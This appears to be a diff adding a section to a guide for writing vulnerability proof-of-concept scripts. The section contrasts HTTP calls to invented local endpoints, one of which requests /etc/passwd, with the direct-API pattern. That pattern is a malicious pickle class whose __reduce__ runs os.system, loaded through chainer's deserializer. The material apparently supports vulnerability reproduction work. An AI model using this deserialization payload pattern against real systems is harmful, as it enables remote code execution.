@@ -123,6 +123,29 @@ MARKER_FILE = '/mnt/ecs-user/analysis/.../vuln001.txt'  # HOST PATH!
 # CORRECT — normal import + container-internal paths
 import keras
 MARKER_FILE = '/tmp/vuln_rce_001_marker.txt'
+
+# FORBIDDEN — library PoC making HTTP requests to a builder-created endpoint
+# Observed in requests, catboost, xgboost, chainer, pandas (30%+ of library PoCs)
+import requests as req  # WRONG use of requests library in a library PoC
+payload = create_pickle_payload()
+req.post("http://localhost:9080/deserialize", data=payload)  # /deserialize doesn't exist in original library!
+req.post("http://localhost:8080/load_pickle", data=payload)  # builder-created endpoint!
+req.post("http://localhost:8080/file/read", json={"path": "/etc/passwd"})  # NOT a real library endpoint!
+
+# CORRECT — library PoC calling the library's actual public API
+import chainer
+import pickle, io
+
+class MaliciousReducer:
+    def __reduce__(self):
+        return (os.system, ('echo CONFIRMED > /tmp/flag',))
+
+payload = pickle.dumps(MaliciousReducer())
+# Call the library function directly — not via HTTP
+with tempfile.NamedTemporaryFile(suffix='.pkl', delete=False) as f:
+    f.write(payload)
+    tmp_path = f.name
+chainer.serializers.load_npz(tmp_path, model)  # Direct API call
 ```
 
 ### Web App PoC Pattern
